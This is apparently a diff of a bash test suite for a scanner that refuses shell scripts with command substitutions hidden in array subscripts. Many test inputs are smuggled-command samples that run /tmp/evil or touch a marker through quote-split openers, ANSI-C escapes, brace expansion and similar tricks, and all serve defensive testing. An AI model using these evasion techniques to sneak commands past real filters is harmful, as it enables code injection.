-hm hm_zs $'declare -A a\ny() { :; }\na[`echo ]`\n<<y ]=1\nz="\n\'"; /tmp/evil; z=\'\n\'\ny\necho end\n' caught 'assignment subscript' 'the same with backticks'
+hm hm_zr $'declare -A a\ny() { :; }\na[$(echo ])\n<<y ]=1\nz="\n'"'"$'"; /tmp/evil; z='"'"$'\n'"'"$'\ny\necho end\n' caught 'assignment subscript' 'a ] in a $( ) inside the subscript, then a << on the next line'
+hm hm_zs $'declare -A a\ny() { :; }\na[`echo ]`\n<<y ]=1\nz="\n'"'"$'"; /tmp/evil; z='"'"$'\n'"'"$'\ny\necho end\n' caught 'assignment subscript' 'the same with backticks'
 hm hm_zt $'declare -A a\na[(echo ]) #]=1; /tmp/evil\necho end\n' caught 'assignment subscript' 'the same with a ( ) group'
 hm hm_zu $'a[$(echo x)]=1\nb[`echo y`]=2\nc[1]=3\necho ok\n' caught 'holds a substitution' 'substitutions inside a closed subscript are refused (default deny, a reviewed waiver per line)'
 # seat B, PR 449 round 6: NAME[ is an assignment subscript also right after a ) (a case pattern) or any other character
@@ -3713,13 +4345,13 @@ hm hm_zzc $'echo x \\\n[ ok ]\necho y\n' ok - 'control: an ordinary continuation
 # DEFAULT DENY (advisor Oct 18, closing the builtin-evaluated-subscript class): a NAME[ whose subscript text holds a substitution ($( , ${ , a backtick, \$ or a backslash-backtick) is refused in a LISTED shell script
 # wherever it sits (code, quotes, a string assignment, a comment: the listed text is scanned raw), waivable by a reviewed line-bound `deny` exception. Builtins evaluate such a string as an arithmetic subscript at run time.
 sb() { local d; d=$(crr "$1" "${H}$2"); expm "$3" "$d" "$4" "subscript: $5"; }
-sb sb_a $'printf -v \'a[$(/tmp/evil)]\' x\n' caught 'holds a substitution' "printf -v with a single-quoted subscript"
-sb sb_b $'let \'a[$(/tmp/evil)]\'\n' caught 'holds a substitution' 'let'
-sb sb_c $'read \'a[$(/tmp/evil)]\' <<< x\n' caught 'holds a substitution' 'read'
-sb sb_d $'[[ -v \'a[$(/tmp/evil)]\' ]]\n' caught 'holds a substitution' '[[ -v ]]'
-sb sb_e $'typeset -n r=\'a[$(/tmp/evil)]\'\n' caught 'holds a substitution' 'typeset -n'
-sb sb_f $'x=\'a[$(/tmp/evil)]\'; echo ${!x}\n' caught 'holds a substitution' 'a string assignment used through ${!x}'
-sb sb_g $'echo $(( \'a[$(/tmp/evil)]\' ))\n' caught 'holds a substitution' 'inside $(( ))'
+sb sb_a $'printf -v '"'"$'a[$(/tmp/evil)]'"'"$' x\n' caught 'holds a substitution' "printf -v with a single-quoted subscript"
+sb sb_b $'let '"'"$'a[$(/tmp/evil)]'"'"$'\n' caught 'holds a substitution' 'let'
+sb sb_c $'read '"'"$'a[$(/tmp/evil)]'"'"$' <<< x\n' caught 'holds a substitution' 'read'
+sb sb_d $'[[ -v '"'"$'a[$(/tmp/evil)]'"'"$' ]]\n' caught 'holds a substitution' '[[ -v ]]'
+sb sb_e $'typeset -n r='"'"$'a[$(/tmp/evil)]'"'"$'\n' caught 'holds a substitution' 'typeset -n'
+sb sb_f $'x='"'"$'a[$(/tmp/evil)]'"'"$'; echo ${!x}\n' caught 'holds a substitution' 'a string assignment used through ${!x}'
+sb sb_g $'echo $(( '"'"$'a[$(/tmp/evil)]'"'"$' ))\n' caught 'holds a substitution' 'inside $(( ))'
 sb sb_h $'printf -v "a[\\$(/tmp/evil)]" x\n' caught 'holds a substitution' 'escaped in double quotes'
 sb sb_i $'printf -v a[\\$\\(/tmp/evil\\)] x\n' caught 'holds a substitution' 'escaped bare'
 sb sb_j $'a[`/tmp/evil`]=1\n' caught 'holds a substitution' 'backticks in a bare assignment subscript'
@@ -3728,97 +4360,97 @@ sb sb_l $'# a comment mentioning a[$(x)] is scanned raw like the rest of a liste
 sb sb_m $'[ "$(echo a)" = a ] && echo ok\n[[ -n "$(echo b)" ]] && echo ok\nx=(1 2); echo "${x[1]} ${x[@]}"\na[$i]=1\na[1]=$(echo c)\necho ok\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): tests with substitutions, ordinary subscripts, a substitution outside the subscript'
 sb sb_n $'a[1]=1\nb[$((1+1))]=2\necho "${a[1]}"\necho ok\n' caught 'holds a substitution' 'arithmetic in a subscript is refused too (a \$(( that does not close as arithmetic is a command substitution); a real one needs a reviewed line waiver'
 # seat B, PR 452 round 1: the opener built from quotes or escapes, and a subscript that starts with a substitution without a NAME before the [
-sb sb_o $'let \'a[$\'\'(/usr/bin/touch mk)]\'\n' caught 'builds a substitution opener' 'the opener split by adjacent single quotes ($'"''"'()'
-sb sb_p $'printf -v \'a[$\'\'(/bin/sh -c /usr/bin/touch\\ mk)]\' x\n' caught 'builds a substitution opener' 'printf -v with a split opener running /bin/sh -c'
+sb sb_o $'let '"'"$'a[$'"'"$''"'"$'(/usr/bin/touch mk)]'"'"$'\n' caught 'builds a substitution opener' 'the opener split by adjacent single quotes ($'"''"'()'
+sb sb_p $'printf -v '"'"$'a[$'"'"$''"'"$'(/bin/sh -c /usr/bin/touch\\ mk)]'"'"$' x\n' caught 'builds a substitution opener' 'printf -v with a split opener running /bin/sh -c'
 sb sb_q $'let "a[$""(/usr/bin/touch mk)]"\n' caught 'builds a substitution opener' 'the opener split by adjacent double quotes'
-sb sb_r $'let $\'a[\\x24(/usr/bin/touch mk)]\'\n' caught 'builds a substitution opener' 'an ANSI-C hex escape builds the $'
-sb sb_s $'let $\'a[\\x60/usr/bin/touch mk\\x60]\'\n' caught 'builds a substitution opener' 'an ANSI-C hex escape builds the backtick'
-sb sb_t $'let a[$\'\\x24\\x28/usr/bin/touch mk)\']\n' caught 'builds a substitution opener' 'an ANSI-C string builds the whole opener'
-sb sb_u $'x=$\'\\044(/usr/bin/touch mk)\'; let "a[$x]"\n' caught 'builds a substitution opener' 'an ANSI-C octal escape'
-sb sb_v $'let \'a\'[\\$\\(/usr/bin/touch\\ mk\\)]\n' caught 'holds a substitution' 'a quote between the name and [ with an escaped opener'
-sb sb_x $'n=a; x="$n"\'[$(/usr/bin/touch mk)]\'; let "$x"\n' caught 'holds a substitution' 'a name built by an expansion, the subscript text starts with the opener'
+sb sb_r $'let $'"'"$'a[\\x24(/usr/bin/touch mk)]'"'"$'\n' caught 'builds a substitution opener' 'an ANSI-C hex escape builds the $'
+sb sb_s $'let $'"'"$'a[\\x60/usr/bin/touch mk\\x60]'"'"$'\n' caught 'builds a substitution opener' 'an ANSI-C hex escape builds the backtick'
+sb sb_t $'let a[$'"'"$'\\x24\\x28/usr/bin/touch mk)'"'"$']\n' caught 'builds a substitution opener' 'an ANSI-C string builds the whole opener'
+sb sb_u $'x=$'"'"$'\\044(/usr/bin/touch mk)'"'"$'; let "a[$x]"\n' caught 'builds a substitution opener' 'an ANSI-C octal escape'
+sb sb_v $'let '"'"$'a'"'"$'[\\$\\(/usr/bin/touch\\ mk\\)]\n' caught 'holds a substitution' 'a quote between the name and [ with an escaped opener'
+sb sb_x $'n=a; x="$n"'"'"$'[$(/usr/bin/touch mk)]'"'"$'; let "$x"\n' caught 'holds a substitution' 'a name built by an expansion, the subscript text starts with the opener'
 sb sb_y $'if [ ${#arr[@]} -gt 0 ]; then echo "${#arr[@]}"; fi\n[[ ${X:-} =~ ^[0-9]+$ ]] && echo ok\n[ "$(echo a)" = a ]\necho ok\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): a length expansion in a test, [[ ${X} ]], a quoted substitution in a test'
-sb sb_z $'echo $\'plain\\n text\' $"msg" \'\' ""\necho ok\n' ok - 'control: ANSI-C with plain escapes, $"..." and empty strings are untouched'
+sb sb_z $'echo $'"'"$'plain\\n text'"'"$' $"msg" '"'"$''"'"$' ""\necho ok\n' ok - 'control: ANSI-C with plain escapes, $"..." and empty strings are untouched'
 # seat A, PR 452 round 1: a nested subscript's ] before the opener; a quote, backslash or } before the [; a continuation between NAME and [ or between [ and the opener
-sb sb_aa $'let \'a[b[0]+$(/usr/bin/touch mk)]\'\n' caught 'holds a substitution' 'a nested subscript closes before the opener'
-sb sb_ab $'printf -v \'a[b[1]$(/usr/bin/touch mk)]\' x\n' caught 'holds a substitution' 'the opener right after a nested ]'
-sb sb_ac $'x=\'a[c[0]*0+`/usr/bin/touch mk`]\'; echo ${!x}\n' caught 'holds a substitution' 'backticks after a nested subscript, through ${!x}'
+sb sb_aa $'let '"'"$'a[b[0]+$(/usr/bin/touch mk)]'"'"$'\n' caught 'holds a substitution' 'a nested subscript closes before the opener'
+sb sb_ab $'printf -v '"'"$'a[b[1]$(/usr/bin/touch mk)]'"'"$' x\n' caught 'holds a substitution' 'the opener right after a nested ]'
+sb sb_ac $'x='"'"$'a[c[0]*0+`/usr/bin/touch mk`]'"'"$'; echo ${!x}\n' caught 'holds a substitution' 'backticks after a nested subscript, through ${!x}'
 sb sb_ad $'printf -v "a""[\\$(/usr/bin/touch mk)]" x\n' caught 'holds a substitution' 'a name quote-split from the [ with an escaped opener'
-sb sb_ae $'printf -v \'a\'\'[$(/usr/bin/touch mk)]\' x\n' caught 'holds a substitution' 'adjacent single-quoted parts, the subscript starts with the opener'
-sb sb_af $'let "a"\'[$(/usr/bin/touch mk)]\'\n' caught 'holds a substitution' 'a double-quoted name then a single-quoted subscript'
+sb sb_ae $'printf -v '"'"$'a'"'"$''"'"$'[$(/usr/bin/touch mk)]'"'"$' x\n' caught 'holds a substitution' 'adjacent single-quoted parts, the subscript starts with the opener'
+sb sb_af $'let "a"'"'"$'[$(/usr/bin/touch mk)]'"'"$'\n' caught 'holds a substitution' 'a double-quoted name then a single-quoted subscript'
 sb sb_ag $'printf -v a\\[\\$\\(/usr/bin/touch\\ mk\\)\\] x\n' caught 'holds a substitution' 'every character backslash-escaped'
 sb sb_ah $'n=a; printf -v "${n}[\\$(/usr/bin/touch mk)]" x\n' caught 'holds a substitution' 'a name from a parameter expansion, then [ and an escaped opener'
 sb sb_ai $'printf -v a\\\n[\\$\\(/usr/bin/touch\\ mk\\)] x\n' caught 'holds a substitution' 'a continuation between the name and the ['
-sb sb_aj $'printf -v \'a[\'\\\n\'$(/usr/bin/touch mk)]\' x\n' caught 'holds a substitution' 'a continuation between the [ and the quoted opener'
+sb sb_aj $'printf -v '"'"$'a['"'"$'\\\n'"'"$'$(/usr/bin/touch mk)]'"'"$' x\n' caught 'holds a substitution' 'a continuation between the [ and the quoted opener'
 sb sb_ak $'[ "${#a[@]}" -gt 0 ] && echo ok\necho "done"\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): a length expansion in a test'
 # seat B, PR 452 round 2: a quoted or split name with a non-opener character between the [ and the opener
-sb sb_al $'let "a"\'[x$(/usr/bin/touch mk)]=1\'\n' caught 'holds a substitution' 'a quoted name, a character before the opener'
-sb sb_am $'let a\'[0$(/usr/bin/touch mk)]=1\'\n' caught 'holds a substitution' 'a digit before the opener'
-sb sb_an $'let \'a\'"[x"\'$(/usr/bin/touch mk)]=1\'\n' caught 'holds a substitution' 'the [ in a different quoted part than the opener'
-sb sb_ao $'printf -v "a"\'[ x$(/usr/bin/touch mk)]\' %s 1\n' caught 'holds a substitution' 'a blank after the [ and a character before the opener'
+sb sb_al $'let "a"'"'"$'[x$(/usr/bin/touch mk)]=1'"'"$'\n' caught 'holds a substitution' 'a quoted name, a character before the opener'
+sb sb_am $'let a'"'"$'[0$(/usr/bin/touch mk)]=1'"'"$'\n' caught 'holds a substitution' 'a digit before the opener'
+sb sb_an $'let '"'"$'a'"'"$'"[x"'"'"$'$(/usr/bin/touch mk)]=1'"'"$'\n' caught 'holds a substitution' 'the [ in a different quoted part than the opener'
+sb sb_ao $'printf -v "a"'"'"$'[ x$(/usr/bin/touch mk)]'"'"$' %s 1\n' caught 'holds a substitution' 'a blank after the [ and a character before the opener'
 sb sb_ap $'echo [ok]; [ -n "$(echo b)" ] && echo ok; if [ "$(echo c)" = c ]; then echo ok; fi; [[ -n "$(echo d)" ]]\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): test commands with substitutions (the [ is at a command position and followed by a blank)'
 # seat A, PR 452 round 2: a quote, escape or brace between the name and the [ (static quoting and brace expansion build the name), with a non-opener prefix or a quote switch after the [
-sb sb_aq $'let a"["\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'a"[" then a single-quoted opener'
-sb sb_ar $'let a\'[\'"\\$(/usr/bin/touch MARK)]"\n' caught 'holds a substitution' "a'[' then a double-quoted escaped opener"
-sb sb_as $'let a\\[\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'a backslash-escaped [ then a quoted opener'
-sb sb_at $'let a\\[0+\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'an escaped [ and a prefix before the opener'
-sb sb_au $'let \'a\'[0+\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'a quoted name, [ and a prefix'
+sb sb_aq $'let a"["'"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'a"[" then a single-quoted opener'
+sb sb_ar $'let a'"'"$'['"'"$'"\\$(/usr/bin/touch MARK)]"\n' caught 'holds a substitution' "a'[' then a double-quoted escaped opener"
+sb sb_as $'let a\\['"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'a backslash-escaped [ then a quoted opener'
+sb sb_at $'let a\\[0+'"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'an escaped [ and a prefix before the opener'
+sb sb_au $'let '"'"$'a'"'"$'[0+'"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'a quoted name, [ and a prefix'
 sb sb_av $'let "a"[0+\\$\\(/usr/bin/touch\\ MARK\\)]\n' caught 'holds a substitution' 'a quoted name, [ , a prefix and an escaped opener'
-sb sb_aw $'printf -v "a"[0+\'`/usr/bin/touch MARK`]\' z\n' caught 'holds a substitution' 'backticks after a prefix'
-sb sb_ax $'let a{[,[}\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'a brace expansion builds the [ '
-sb sb_ay $'let a{\\[,\\[}\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'a brace expansion of escaped ['
-sb sb_az $'printf -v a{\\[,}\'$(/usr/bin/touch MARK)]\' z z\n' caught 'holds a substitution' 'a brace expansion with an empty alternative'
-sb sb_ba $'let a{"[",x}\'$(/usr/bin/touch MARK)]\'\n' caught 'holds a substitution' 'a quoted [ inside a brace expansion'
+sb sb_aw $'printf -v "a"[0+'"'"$'`/usr/bin/touch MARK`]'"'"$' z\n' caught 'holds a substitution' 'backticks after a prefix'
+sb sb_ax $'let a{[,[}'"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'a brace expansion builds the [ '
+sb sb_ay $'let a{\\[,\\[}'"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'a brace expansion of escaped ['
+sb sb_az $'printf -v a{\\[,}'"'"$'$(/usr/bin/touch MARK)]'"'"$' z z\n' caught 'holds a substitution' 'a brace expansion with an empty alternative'
+sb sb_ba $'let a{"[",x}'"'"$'$(/usr/bin/touch MARK)]'"'"$'\n' caught 'holds a substitution' 'a quoted [ inside a brace expansion'
 # seat A, PR 452 round 3: a brace expansion builds a[[ and the test-command exemption skipped both brackets
-sb sb_bb $'let a{[[,}\'$(/usr/bin/touch MARK)]]\'\n' caught 'holds a substitution' 'a{[[,} builds a[[ ; the exemption must not skip it'
-sb sb_bc $'printf -v a{[[,}\'$(/usr/bin/touch MARK)]]\' %s 1\n' caught 'holds a substitution' 'the same through printf -v'
-sb sb_bd $'read a{[[,}\'$(/usr/bin/touch MARK)]]\' <<< 1 || true\n' caught 'holds a substitution' 'the same through read'
-sb sb_be $'let a{[[,}0+\'$(/usr/bin/touch MARK)]]\'\n' caught 'holds a substitution' 'with a prefix before the opener'
+sb sb_bb $'let a{[[,}'"'"$'$(/usr/bin/touch MARK)]]'"'"$'\n' caught 'holds a substitution' 'a{[[,} builds a[[ ; the exemption must not skip it'
+sb sb_bc $'printf -v a{[[,}'"'"$'$(/usr/bin/touch MARK)]]'"'"$' %s 1\n' caught 'holds a substitution' 'the same through printf -v'
+sb sb_bd $'read a{[[,}'"'"$'$(/usr/bin/touch MARK)]]'"'"$' <<< 1 || true\n' caught 'holds a substitution' 'the same through read'
+sb sb_be $'let a{[[,}0+'"'"$'$(/usr/bin/touch MARK)]]'"'"$'\n' caught 'holds a substitution' 'with a prefix before the opener'
 sb sb_bf $'{ [ -n "$(echo a)" ]; }\nif [[ "$(echo b)" = b ]]; then echo ok; fi\n(( 1 )) && [[ -n "$(echo c)" ]] && echo ok\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): a group before a test, [[ ]] after if, [[ ]] after &&'
 # seat A, PR 452 round 4: $! expands to nothing or a PID, so the ! before [ is no command position when a $ precedes it
-sb sb_bg $'let "a$![ "\'$(/usr/bin/touch MARK) ]\'\n' caught 'holds a substitution' '$![ : the ! ends $!'
-sb sb_bh $'let "a$![ "\'`/usr/bin/touch MARK` ]\'\n' caught 'holds a substitution' 'the same with backticks'
-sb sb_bi $'sleep 0 & let "a$![ "\'$(/usr/bin/touch MARK) ]\'\n' caught 'holds a substitution' 'with a background job'
-sb sb_bj $'declare -n r="a$![ "\'$(/usr/bin/touch MARK) ]\'; : "$r"\n' caught 'holds a substitution' 'through a nameref'
-sb sb_bk $'let "a$$[ "\'$(/usr/bin/touch MARK) ]\'\n' caught 'holds a substitution' 'the PID of the shell before the ['
+sb sb_bg $'let "a$![ "'"'"$'$(/usr/bin/touch MARK) ]'"'"$'\n' caught 'holds a substitution' '$![ : the ! ends $!'
+sb sb_bh $'let "a$![ "'"'"$'`/usr/bin/touch MARK` ]'"'"$'\n' caught 'holds a substitution' 'the same with backticks'
+sb sb_bi $'sleep 0 & let "a$![ "'"'"$'$(/usr/bin/touch MARK) ]'"'"$'\n' caught 'holds a substitution' 'with a background job'
+sb sb_bj $'declare -n r="a$![ "'"'"$'$(/usr/bin/touch MARK) ]'"'"$'; : "$r"\n' caught 'holds a substitution' 'through a nameref'
+sb sb_bk $'let "a$$[ "'"'"$'$(/usr/bin/touch MARK) ]'"'"$'\n' caught 'holds a substitution' 'the PID of the shell before the ['
 sb sb_bl $'if ! [ -n "$(echo a)" ]; then echo ok; fi\nx=$([ -n y ] && echo z)\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): a real negated test, and a test inside $( ) without a substitution in it'
 # seat B, PR 452 round 5: [ ... ]= inside a compound assignment a=( [ '...' ]=1 ) is a subscript after a blank or (; a bracket expression whose closing ] is directly followed by = is never a test
-sb sb_bm $'a=( [ \'$(/usr/bin/touch M1)\' ]=1 )\n' caught 'holds a substitution' 'a compound assignment element after a blank'
-sb sb_bn $'a=([ \'$(/usr/bin/touch M1)\' ]=1)\n' caught 'holds a substitution' 'right after the ('
-sb sb_bo $'a=(x [ \'$(/usr/bin/touch M1)\' ]=1 )\n' caught 'holds a substitution' 'after another element'
-sb sb_bp $'declare -a a; a=( [ \'x$(/usr/bin/touch M1)\' ]+=1 )\n' caught 'holds a substitution' 'the += form with a prefix'
+sb sb_bm $'a=( [ '"'"$'$(/usr/bin/touch M1)'"'"$' ]=1 )\n' caught 'holds a substitution' 'a compound assignment element after a blank'
+sb sb_bn $'a=([ '"'"$'$(/usr/bin/touch M1)'"'"$' ]=1)\n' caught 'holds a substitution' 'right after the ('
+sb sb_bo $'a=(x [ '"'"$'$(/usr/bin/touch M1)'"'"$' ]=1 )\n' caught 'holds a substitution' 'after another element'
+sb sb_bp $'declare -a a; a=( [ '"'"$'x$(/usr/bin/touch M1)'"'"$' ]+=1 )\n' caught 'holds a substitution' 'the += form with a prefix'
 sb sb_bq $'if [ a = b ]; then echo ok; fi\n[ -n x ] && [ y = y ]\n[[ a == b ]]\na=( [0]=1 [1]=2 )\n' ok - 'control: tests whose ] is followed by ; or a blank or &&, and plain compound elements'
 # seat A, PR 452 round 6: a ] inside ${x//]/} (or ${x%]}, ${x#]}) is not the closing bracket; any ]= or ]+= later on the line makes an earlier [ a candidate subscript (scanned), never a test
-sb sb_br $'a=( [ \'$(/usr/bin/touch MARK)\' ${x//]/} ]=1 )\n' caught 'holds a substitution' 'a ] inside ${x//]/} before the real closing ]'
-sb sb_bs $'a=( [ \'$(/usr/bin/touch MARK)\'${x%]} ]=1 )\n' caught 'holds a substitution' 'a ] inside ${x%]}'
-sb sb_bt $'a=( [ \'$(/usr/bin/touch MARK)\' ${x#]} ]=1 )\n' caught 'holds a substitution' 'a ] inside ${x#]}'
+sb sb_br $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$' ${x//]/} ]=1 )\n' caught 'holds a substitution' 'a ] inside ${x//]/} before the real closing ]'
+sb sb_bs $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$'${x%]} ]=1 )\n' caught 'holds a substitution' 'a ] inside ${x%]}'
+sb sb_bt $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$' ${x#]} ]=1 )\n' caught 'holds a substitution' 'a ] inside ${x#]}'
 sb sb_bu $'[ -n x ] && [ y = y ]\nif [ a = b ]; then echo ok; fi\nb[1]=2; [ -n "$b" ] && echo ok\n' ok - 'control: tests, and a later ]= on another line or after a test that holds no substitution'
 # seat A, PR 452 round 7: a [ left unclosed at the end of its logical line is never a test (a test does not span lines): in a compound assignment bash reads the subscript across the newline
-sb sb_bv $'a=( [ \'$(/usr/bin/touch MARK)\'\n]=1 )\n' caught 'holds a substitution' 'the ]= on the next physical line'
-sb sb_bw $'a=(\n[ \'$(/usr/bin/touch MARK)\'\n]=1\n)\n' caught 'holds a substitution' 'every element on its own line'
+sb sb_bv $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$'\n]=1 )\n' caught 'holds a substitution' 'the ]= on the next physical line'
+sb sb_bw $'a=(\n[ '"'"$'$(/usr/bin/touch MARK)'"'"$'\n]=1\n)\n' caught 'holds a substitution' 'every element on its own line'
 sb sb_bx $'a=( [ "`/usr/bin/touch MARK`"\n]+=1 )\n' caught 'holds a substitution' 'backticks and +='
 sb sb_by $'if [ -n x ]; then\n  echo ok\nfi\n[[ -n y ]] &&\n  echo ok\n' ok - 'control: tests closed on their own line, with the && continuing on the next'
 # seat B, PR 452 round 8: a ] inside ${x//]/} (or a quoted span) counted as the matching bracket while the real ]= sits on the next physical line: the exemption needs the matching ] to be followed by a blank, ; & | ) or the end of the line
-sb sb_bz $'a=( [ \'$(/usr/bin/touch MARK)\' ${x//]/}\n]=1 )\n' caught 'holds a substitution' 'a ] inside ${x//]/} on the first line, ]= on the next'
-sb sb_ca $'a=( [ \'$(/usr/bin/touch MARK)\' "${x//]/}"\n]=1 )\n' caught 'holds a substitution' 'the same inside double quotes'
-sb sb_cb $'a=( [ \'$(/usr/bin/touch MARK)\' ${x%]}\n]=1 )\n' caught 'holds a substitution' 'a ] inside ${x%]}'
+sb sb_bz $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$' ${x//]/}\n]=1 )\n' caught 'holds a substitution' 'a ] inside ${x//]/} on the first line, ]= on the next'
+sb sb_ca $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$' "${x//]/}"\n]=1 )\n' caught 'holds a substitution' 'the same inside double quotes'
+sb sb_cb $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$' ${x%]}\n]=1 )\n' caught 'holds a substitution' 'a ] inside ${x%]}'
 sb sb_cc $'[ -n "$(echo a)" ] && echo ok\n[ -n "$(echo b)" ];\n[ -n "$(echo c)" ]|| echo ok\n( [ -n "$(echo d)" ] )\n' caught 'holds a substitution' 'tests are not exempt (a reviewed waiver per line): tests whose matching ] is followed by a blank, ; | or )'
 # seat B, PR 452 round 9 (the cap): the exemption's escape-aware bracket count can be fooled by a ] followed by a blank inside ${x//] /}: advisor ruling: DROP the test-command exemption entirely (fail closed): every [ is scanned, a real test that holds a substitution needs a reviewed waiver
-sb sb_cd $'a=( [ \'$(/usr/bin/touch MARK)\' ${x//] /}\n]=1 )\n' caught 'holds a substitution' 'a ] followed by a blank inside ${x//] /} then ]= on the next line'
+sb sb_cd $'a=( [ '"'"$'$(/usr/bin/touch MARK)'"'"$' ${x//] /}\n]=1 )\n' caught 'holds a substitution' 'a ] followed by a blank inside ${x//] /} then ]= on the next line'
 sb sb_ce $'[ "$(echo a)" = a ] && echo ok\n' caught 'holds a substitution' 'a real test that holds a substitution is refused (needs a waiver): no exemption'
 sb sb_cf $'[[ -n "$(echo b)" ]] && echo ok\n' caught 'holds a substitution' 'the same for [[ ]]'
 sb sb_cg $'if [ "${#a[@]}" -gt 0 ]; then echo ok; fi\n' caught 'holds a substitution' 'a ${#a[@]} in a test is refused too (no exemption, a reviewed waiver)'
 sb sb_ch $'[ -n x ] && echo ok\n[[ a == b ]] || echo ok\nif [ -f /etc/hosts ]; then echo "$((1+1))"; fi\nx=(1 2); echo "${x[0]}"\n' ok - 'control: tests, arithmetic and a plain array element with no substitution in any bracket are untouched'
 # seat B, PR 452 fix check: a ] inside a QUOTED span closes the raw bracket count early while bash's subscript parser skips quoted text and keeps reading
-sb sb_ci $'let \'a["]"$(/usr/bin/touch mk)]=1\'\n' caught 'holds a substitution' 'a double-quoted ] before the opener'
-sb sb_cj $'printf -v \'a["]"$(/usr/bin/touch mk)]\' z\n' caught 'holds a substitution' 'printf -v'
-sb sb_ck $'read \'a["]"$(/usr/bin/touch mk)]\' <<<1\n' caught 'holds a substitution' 'read'
-sb sb_cl $'let \'a["]"`/usr/bin/touch mk`]=1\'\n' caught 'holds a substitution' 'backticks'
-sb sb_cm $'let a[\']\'$(/usr/bin/touch mk)]=1\n' caught 'holds a substitution' 'a single-quoted ]'
+sb sb_ci $'let '"'"$'a["]"$(/usr/bin/touch mk)]=1'"'"$'\n' caught 'holds a substitution' 'a double-quoted ] before the opener'
+sb sb_cj $'printf -v '"'"$'a["]"$(/usr/bin/touch mk)]'"'"$' z\n' caught 'holds a substitution' 'printf -v'
+sb sb_ck $'read '"'"$'a["]"$(/usr/bin/touch mk)]'"'"$' <<<1\n' caught 'holds a substitution' 'read'
+sb sb_cl $'let '"'"$'a["]"`/usr/bin/touch mk`]=1'"'"$'\n' caught 'holds a substitution' 'backticks'
+sb sb_cm $'let a['"'"$']'"'"$'$(/usr/bin/touch mk)]=1\n' caught 'holds a substitution' 'a single-quoted ]'
 sb sb_cn $'x=(1 2); echo "${x[0]}" "a]b"; [ "a]b" = c ] || echo ok\n' ok - 'control: a quoted ] with no opener anywhere in the brackets'
 # seat B, PR 452 narrow verification: an ESCAPED quote inside a double-quoted word becomes a real quote for the builtin that parses the subscript: \"]\" hides the ]
 sb sb_co $'let "a[\\"]\\"\\$(/usr/bin/touch mk)]=1"\n' caught 'holds a substitution' 'an escaped double-quoted ] before the opener'
-sb sb_cp $'let "a[\\\'] \\\'\\$(/usr/bin/touch mk)]=1"\n' caught 'holds a substitution' 'an escaped single-quoted ] before the opener'
+sb sb_cp $'let "a[\\'"'"$'] \\'"'"$'\\$(/usr/bin/touch mk)]=1"\n' caught 'holds a substitution' 'an escaped single-quoted ] before the opener'
 sb sb_cq $'printf -v "a[\\"]\\"\\$(/usr/bin/touch mk)]" z\n' caught 'holds a substitution' 'printf -v'
 sb sb_cr $'let "a[\\"]\\"`/usr/bin/touch mk`]=1"\n' caught 'holds a substitution' 'backticks'
 sb sb_cs $'echo "x=\\"a]b\\" y"; [ -n "a\\"b" ] && echo ok\n' ok - 'control: escaped quotes in plain strings with no opener in any bracket'
@@ -3833,313 +4465,311 @@ sb sb_cz $'let a[\\"\\\\"]\\$(/usr/bin/touch mk)"]\n' caught 'holds a substituti
 sb sb_da $'let a[\\"x\\\\"]\\$(/usr/bin/touch mk)"]\n' caught 'holds a substitution' 'same with text before the double backslash'
 sb sb_db $'let a[\\"\\\\"]\\`/usr/bin/touch mk\\`"]\n' caught 'holds a substitution' 'backtick form'
 sb sb_dc $'let a[\\"\\\\"]"\\$(/usr/bin/touch mk)"]\n' caught 'holds a substitution' 'opener inside the later quote'
-sb sb_dd $'let \'a[$((/usr/bin/touch mk) )]=1\'\n' caught 'holds a substitution' '$(( that does not close as arithmetic is a command substitution'
-sb sb_de $'printf -v \'a[$((/usr/bin/touch mk);id)]\' z\n' caught 'holds a substitution' 'printf -v, $(( then ;'
-sb sb_df $'read \'a[$((/usr/bin/touch mk) )]\' <<< x\n' caught 'holds a substitution' 'read'
-sb sb_dg $'[[ -v \'a[$((/usr/bin/touch mk)|(id))]\' ]]\n' caught 'holds a substitution' '[[ -v, closes with ))'
+sb sb_dd $'let '"'"$'a[$((/usr/bin/touch mk) )]=1'"'"$'\n' caught 'holds a substitution' '$(( that does not close as arithmetic is a command substitution'
+sb sb_de $'printf -v '"'"$'a[$((/usr/bin/touch mk);id)]'"'"$' z\n' caught 'holds a substitution' 'printf -v, $(( then ;'
+sb sb_df $'read '"'"$'a[$((/usr/bin/touch mk) )]'"'"$' <<< x\n' caught 'holds a substitution' 'read'
+sb sb_dg $'[[ -v '"'"$'a[$((/usr/bin/touch mk)|(id))]'"'"$' ]]\n' caught 'holds a substitution' '[[ -v, closes with ))'
 sb sb_dh $'let a[$((i+1))]=2\n' caught 'holds a substitution' 'even real arithmetic in a subscript is refused (default deny; waive by line)'
 sb sb_di $'i=1; x=$((i+1)); echo "$x"; [ -n "$x" ] && echo ok\n' ok - 'control: arithmetic outside any bracket'
 dc() { local d; d=$(crr "$1" "${H}$2"); expm "$3" "$d" "$4" "declare-family compound assignment: $5"; }
-dc dc_a $'declare -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'declare -a, single-quoted, $( )'
